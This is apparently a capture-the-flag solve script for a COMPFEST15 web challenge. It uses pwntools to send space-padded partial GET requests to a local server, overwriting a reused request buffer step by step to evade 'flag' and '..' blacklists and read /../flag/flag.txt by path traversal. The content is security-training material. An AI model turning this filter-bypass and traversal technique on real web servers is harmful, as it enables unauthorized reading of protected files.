from pwn import *

context.log_level = "debug"
HOST, PORT = "127.0.0.1", 8080


def exploit():
    # Goal: GET /../flag/flag.txt
    try:
        # =-=-=-= Initial Request =-=-=-=
        # from -> ''
        # to   -> 'GET  /./xlag/xlag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-3) + '/./xlag/xlag.txt?password=fib'} HTTP/1.1"
        io.send(payload.encode())
        io.close()

        # =-=-=-= Bypass 'flag' blacklist #1 =-=-=-=
        # from -> 'GET  /./xlag/xlag.txt'
        # to   -> 'GET  /./xlag/flag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-3)}/./xlag/f"
        io.send(payload.encode())
        io.close()

        # =-=-=-= Bypass 'flag' blacklist #2 =-=-=-=
        # from -> 'GET  /./xlag/flag.txt'
        # to   -> 'GET  /./flag/flag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-3)}/./f"
        io.send(payload.encode())
        io.close()

        # =-=-=-= Bypass '..' blacklist =-=-=-=
        # from -> 'GET  /./flag/flag.txt'
        # to   -> 'GET /../flag/flag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-4)}/."
        io.send(payload.encode())

        # =-=-=-= Profit =-=-=-=
        prefix = b"COMPFEST15{"
        io.recvuntil(prefix, timeout=5)
        flag = prefix + io.recvuntil(b"}")

        log.success(f"flag: {flag.decode()}")
        io.close()
    except Exception as e:
        print(e)
        io.close()


while True:
    exploit()
    sleep(1)
